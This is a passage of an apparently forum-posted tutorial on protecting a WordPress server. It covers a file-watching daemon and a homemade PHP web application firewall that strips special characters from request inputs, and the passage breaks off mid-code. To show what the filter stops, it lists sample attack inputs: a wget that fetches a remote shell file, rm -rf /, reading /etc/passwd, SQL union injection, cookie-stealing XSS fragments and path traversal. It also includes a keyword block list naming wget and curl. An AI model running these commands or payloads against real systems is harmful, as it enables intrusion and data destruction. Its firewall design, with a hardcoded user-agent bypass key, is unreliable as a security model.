<span style="color: #0000BB">wget&nbsp;https</span><span style="color: #007700">:</span><span style="color: #FF8000">//github.com/Ali-Razmjoo/z3r0d4y/blob/master/service.zip?raw=true&nbsp;--no-check-certificate<br /></span><span style="color: #0000BB">unzip&nbsp;service</span><span style="color: #007700">.</span><span style="color: #0000BB">zip<br />cd&nbsp;service<br />mv&nbsp;</span><span style="color: #007700">*&nbsp;../<br /></span><span style="color: #0000BB">cd&nbsp;</span><span style="color: #007700">..<br /></span><span style="color: #0000BB">rm&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">rf&nbsp;service<br />cd&nbsp;daemon<br />make&nbsp;<br /></span>
</span>
</code></code></div>
</div>If return you any error. <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:96px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">yum&nbsp;install&nbsp;gcc<br />gcc&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon</span><span style="color: #007700">.</span><span style="color: #0000BB">c&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">o&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon<br />cp&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">usr</span><span style="color: #007700">/</span><span style="color: #0000BB">sbin</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">chmod&nbsp;755&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">usr</span><span style="color: #007700">/</span><span style="color: #0000BB">sbin</span><span style="color: #007700">/</span><span style="color: #0000BB">start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon<br />start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">V<br /></span><span style="color: #FF8000">#output:&nbsp;start-stop-daemon&nbsp;1.9.18&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And then <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:120px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">cd&nbsp;</span><span style="color: #007700">..<br /></span><span style="color: #0000BB">rm&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">rf&nbsp;daemon<br />rm&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">rf&nbsp;service</span><span style="color: #007700">.</span><span style="color: #0000BB">zip<br />mv&nbsp;zeroday&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">init</span><span style="color: #007700">.</span><span style="color: #0000BB">d</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">chmod&nbsp;755&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">init</span><span style="color: #007700">.</span><span style="color: #0000BB">d</span><span style="color: #007700">/</span><span style="color: #0000BB">zeroday<br />mv&nbsp;</span><span style="color: #007700">*.</span><span style="color: #0000BB">py&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">root</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">cd&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">root</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">chmod&nbsp;755&nbsp;</span><span style="color: #007700">*.</span><span style="color: #0000BB">py&nbsp;<br /></span>
</span>
</code></code></div>
</div>And now run and edit md5.py <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:144px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#nano&nbsp;md5.py&nbsp;=&gt;&nbsp;replace&nbsp;public_html&nbsp;directory&nbsp;in&nbsp;line&nbsp;13<br /></span><span style="color: #007700">&#91;</span><span style="color: #0000BB">root</span><span style="color: #007700">@</span><span style="color: #0000BB">localhost&nbsp;</span><span style="color: #007700">~&#93;</span><span style="color: #FF8000">#&nbsp;python&nbsp;md5.py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;output:<br /></span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e<br />Stopping&nbsp;httpd</span><span style="color: #007700">:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#91;&nbsp;&nbsp;</span><span style="color: #0000BB">OK&nbsp;&nbsp;</span><span style="color: #007700">&#93;<br /><br /></span><span style="color: #0000BB">All&nbsp;Dead<br /><br />Killed<br /></span><span style="color: #FF8000">#-------------------------------------------------<br /></span><span style="color: #0000BB">nano&nbsp;md5</span><span style="color: #007700">.</span><span style="color: #0000BB">py&nbsp;<br /></span>
</span>
</code></code></div>
</div>Go to line 52 and replace this md5 with md5 inside file ,And try to run it again. <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">&#91;</span><span style="color: #0000BB">root</span><span style="color: #007700">@</span><span style="color: #0000BB">localhost&nbsp;</span><span style="color: #007700">~&#93;</span><span style="color: #FF8000">#&nbsp;python&nbsp;md5.py<br /></span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e<br />pass&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">md5</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e<br />d41d8cd98f00b204e9800998ecf8427e<br />pass&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">md5</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e<br />d41d8cd98f00b204e9800998ecf8427e<br />pass&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">md5</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e&nbsp;<br /></span>
</span>
</code></code></div>
</div>Next step you have to replace php file link address in out.py at line 8. And now it’s working now.<br />
<br />
And now about that php file , you should replace your primary word to your site name or title and then upload it on other host [you can also use free hosting as I said before] and now your service works well.<br />
<br />
Until now, if your server files change, this robot will stop Apache webserver, so it means any one cannot upload any badware [ shell scripts or anything ] on your website or deface your website or if any DOS/DDOS attack or crashing happen, it will ban attacker(s) IP and restart Apache webserver. this robot need to develop to work more easy and if I get more free time I’ll improve it and make it easy to work.<br />
<br />
But now , about other 0day Vulnerabilities on wordpress or plugins [Or any CMS you used] , We need to filter something on GET and POST Requests but if you think I want start listing words same<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:120px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">union<br />select<br />wget<br />alert</span><span style="color: #007700">(<br /></span><span style="color: #0000BB">wget<br />curl<br />information<br /></span><span style="color: #007700">and&nbsp;</span><span style="color: #0000BB">bla&nbsp;bla&nbsp;<br /></span>
</span>
</code></code></div>
</div>You are so wrong, because it’s so ridicules and it bypass easy so the best way it’s filter these characters. <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">!@</span><span style="color: #FF8000">#$%^&amp;*()_+=-\|}{&#91;&#93;:"</span><span style="color: #0000BB">?&gt;</span>&lt;;'/.,&nbsp;<br /></span>
</code></code></div>
</div>Note: I said filter GET and POST, It’s just an example for inputs.<br />
 If we filter these characters most vulnerabilities will disable Examples:<br />
<br />
RCE: <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">cat&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">passwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;=&nbsp;&nbsp;</span><span style="color: #0000BB">This&nbsp;Char&nbsp;filtered&nbsp;by&nbsp;firewall<br />ls&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">la&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;-<br />echo&nbsp;</span><span style="color: #0000BB">1&nbsp;</span><span style="color: #007700">&gt;&nbsp;</span><span style="color: #0000BB">1&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;&nbsp;&nbsp;&gt;<br /></span><span style="color: #0000BB">wget&nbsp;http</span><span style="color: #007700">:</span><span style="color: #FF8000">//z3r0d4y.com/shell.txt&nbsp;=&gt;&nbsp;://&nbsp;.&nbsp;.<br /></span><span style="color: #0000BB">curl&nbsp;z3r0d4y</span><span style="color: #007700">.</span><span style="color: #0000BB">com&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;.<br /></span><span style="color: #0000BB">rm&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">rf&nbsp;</span><span style="color: #007700">/&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;-&nbsp;/<br /></span><span style="color: #0000BB">rm&nbsp;</span><span style="color: #007700">*&nbsp;&nbsp;&nbsp;=&gt;&nbsp;*&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>SQL:<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:48px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Union&nbsp;Select&nbsp;1</span><span style="color: #007700">,</span><span style="color: #0000BB">2</span><span style="color: #007700">,</span><span style="color: #0000BB">3</span><span style="color: #007700">,</span><span style="color: #0000BB">4</span><span style="color: #007700">,</span><span style="color: #0000BB">5&nbsp;from&nbsp;admin</span><span style="color: #007700">--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&nbsp;,&nbsp;-<br /></span><span style="color: #0000BB">hex</span><span style="color: #007700">(&nbsp;,&nbsp;</span><span style="color: #0000BB">unhex</span><span style="color: #007700">(&nbsp;,&nbsp;</span><span style="color: #0000BB">grpup_contact</span><span style="color: #007700">(&nbsp;,&nbsp;</span><span style="color: #0000BB">bla&nbsp;bla&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;(&nbsp;</span><span style="color: #0000BB">_&nbsp;<br /></span>
</span>
</code></code></div>
</div>XSS:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:72px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">alert</span><span style="color: #007700">(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;(&nbsp;&nbsp;<br />&lt;</span><span style="color: #0000BB">img</span><span style="color: #007700">&gt;&nbsp;&lt;&nbsp;&nbsp;<br /></span><span style="color: #0000BB">scr</span><span style="color: #007700">=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;=&nbsp;&nbsp;<br /></span><span style="color: #0000BB">document</span><span style="color: #007700">.</span><span style="color: #0000BB">cookie&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;.&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>LFI:<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:48px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">passwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;/&nbsp;&nbsp;<br />../&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;.&nbsp;/&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And more …<br />
<br />
See everything filtered by a simple way, But it’s not all. Wordpress Admin panel and guest users need to send this chars. we should not block them from comment or block admin requests for send post or any jquery or java POSTs in admin panel. So we need a white list [Exception list] to Handle these. All you to do is put “wp-comments-post.php” file in white list for users comments and generate a random MD5 or any primary key for using on Admin user agent and handle in Exception. Then you can have your private key to be admin and login in admin panel, send your posts without any problem [My Suggestion is use Firefox UserAgent switcher Add-Ons]. Next Step is Handle your code in config.php and we done with our WAF.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">//Code&nbsp;By&nbsp;Ali&nbsp;Razmjoo<br />//waf.php<br />//https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/waf.php<br /></span><span style="color: #0000BB">$list_exceptions&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">"/wp-comments-post.php"</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$list_deny&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">"`"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"~"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"!"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"@"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"#"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"$"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"%"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"^"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&amp;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"*"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"("</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">")"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"-"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"_"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"+"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&#91;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&#93;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"{"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"}"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"\\"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"|"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">";"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">":"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"'"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'"'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&lt;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&gt;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"?"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"/"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">","</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"."</span><span style="color: #007700">,<br />);<br /></span><span style="color: #0000BB">$detect&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$get&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$protocol&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'SERVER_PROTOCOL'</span><span style="color: #007700">&#93;),</span><span style="color: #DD0000">'https'</span><span style="color: #007700">)&nbsp;===&nbsp;</span><span style="color: #0000BB">FALSE&nbsp;</span><span style="color: #007700">?&nbsp;</span><span style="color: #DD0000">'http'&nbsp;</span><span style="color: #007700">:&nbsp;</span><span style="color: #DD0000">'https'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$host&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'HTTP_HOST'</span><span style="color: #007700">&#93;;<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'SCRIPT_NAME'</span><span style="color: #007700">&#93;;<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'QUERY_STRING'</span><span style="color: #007700">&#93;;<br /></span><span style="color: #0000BB">$currentUrl&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$protocol&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #DD0000">'://'&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">$host&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #DD0000">'?'&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">$params</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$agent&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'HTTP_USER_AGENT'</span><span style="color: #007700">&#93;;<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">,</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$get&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span style="color: #0000BB">$j</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_exceptions</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">,</span><span style="color: #0000BB">$list_exceptions</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$get&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$get&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$agent</span><span style="color: #007700">,</span><span style="color: #DD0000">'b00c52cac042640c440db9684a59ae36'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_GET&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"***&#91;firewall&#93;***"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />}<br />foreach(</span><span style="color: #0000BB">$_POST&nbsp;</span><span style="color: #007700">as&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&gt;&nbsp;</span><span style="color: #0000BB">$value</span><span style="color: #007700">){<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$key</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$value&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">);<br />&nbsp;&nbsp;for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">,</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span style="color: #0000BB">$j</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_exceptions</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">,</span><span style="color: #0000BB">$list_exceptions</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$agent</span><span style="color: #007700">,</span><span style="color: #DD0000">'b00c52cac042640c440db9684a59ae36'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_POST&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"***&#91;firewall&#93;***"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br 